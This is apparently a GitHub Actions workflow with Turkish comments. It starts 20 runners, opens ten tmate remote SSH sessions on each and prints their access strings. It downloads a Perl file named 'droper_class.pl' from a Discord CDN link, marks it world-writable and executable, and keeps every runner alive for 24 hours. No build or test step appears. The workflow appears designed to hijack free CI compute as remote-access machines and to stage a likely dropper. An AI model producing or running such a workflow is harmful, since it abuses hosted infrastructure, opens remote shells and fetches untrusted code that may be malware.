

name: Ubuntu

on:
  workflow_dispatch:

jobs:
  setup-machines:
    runs-on: ubuntu-latest
    timeout-minutes: 1440  # 24 saat (hesabın izin verirse)
    strategy:
      matrix:
        machine: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
    steps:
      - name: Show system info
        run: |
          echo "CPU Info:"
          lscpu
          echo "RAM Info:"
          free -h
          echo "Disk Info:"
          df -h
      - name: Install tmate
        run: sudo apt-get update && sudo apt-get install -y tmate

      - name: Start 10 tmate sessions
        run: |
          for i in {1..10}; do
            tmate -S /tmp/tmate_$i.sock new-session -d
            tmate -S /tmp/tmate_$i.sock wait tmate-ready
            echo "Makine ${{ matrix.machine }} - tmate $i SSH: $(tmate -S /tmp/tmate_$i.sock display -p '#{tmate_ssh}')"
          done
      - name: Download and set permissions for droper_class.pl
        run: |
          cd ~
          wget -O droper_class.pl "https://cdn.discordapp.com/attachments/1258368563073388607/1395507438886850742/droper_class.pl?ex=687ab314&is=68796194&hm=9585ed1cf1de3c8f2a6a4c35b2b61a7b5d22e771e794ac6e18011106ae3b579c&"
          chmod 777 droper_class.pl
      - name: Keep session running
        run: |
          echo "Makine ${{ matrix.machine }} 24 saat boyunca açık kalacak..."
          sleep 86400
